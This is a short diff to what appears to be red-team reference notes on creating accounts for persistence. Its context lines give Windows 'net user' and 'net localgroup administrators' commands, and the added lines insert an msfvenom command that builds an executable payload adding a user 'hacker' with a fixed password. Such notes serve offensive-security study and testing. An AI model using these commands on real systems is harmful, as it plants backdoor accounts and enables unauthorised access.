@@ -15,3 +15,6 @@ Adversaries may create an account to maintain access to victim systems. With a s
 - Add account to admin group `net localgroup administrators <username> /add`
 - Remove an account `net user <username> /delete`
 - Change password of an account `net user <username> <newpassword>`
+- Create User
+
+		 msfvenom -p windows/adduser USER=hacker PASS=Hacker123$ -f exe > adduser.exe
